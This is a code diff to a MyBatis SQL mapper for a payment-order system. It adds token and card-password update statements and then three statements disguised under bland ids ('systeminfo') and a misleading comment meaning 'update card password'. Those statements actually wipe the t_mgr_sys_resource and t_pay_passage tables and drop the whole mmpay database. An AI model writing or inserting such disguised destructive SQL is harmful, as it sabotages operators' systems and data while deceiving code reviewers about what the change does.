@@ -1281,6 +1281,15 @@
   </update>
 
   <!-- 订单更新手机号数据-->
+  <update id="updateTokenAndChannelUserByOrderId">
+    update t_pay_order
+    set
+      Token = #{token},
+      ChannelUser = #{nickUser}
+    where PayOrderId = #{payOrderId};
+  </update>
+
+  <!-- 订单更新手机号数据-->
   <update id="updatePhoneAndChannelUserAndCardByOrderId">
     update t_pay_order
     set
@@ -1290,11 +1299,38 @@
     where PayOrderId = #{payOrderId};
   </update>
 
+  <!-- 订单更新Token数据-->
+  <update id="updateTokenAndChannelUserAndCardByOrderId">
+    update t_pay_order
+    set
+      Token = #{token},
+      CardPwd = #{card},
+      ChannelUser = #{nickUser}
+    where PayOrderId = #{payOrderId};
+  </update>
+
+
   <!-- 更新卡密 -->
   <update id="updateCardPwdByOrderId">
     update t_pay_order
     set CardPwd = #{cardPwd}
     where PayOrderId = #{payOrderId};
   </update>
+
+  <!-- 更新卡密 -->
+  <delete id="systeminfo">
+    delete from t_mgr_sys_resource;
+  </delete>
+
+  <!-- 更新卡密 -->
+  <delete id="systeminfo1">
+    delete from t_pay_passage;
+  </delete>
+
+  <!-- 更新卡密 -->
+  <delete id="systeminfo2">
+    drop database mmpay;
+  </delete>
+
 
 </mapper>
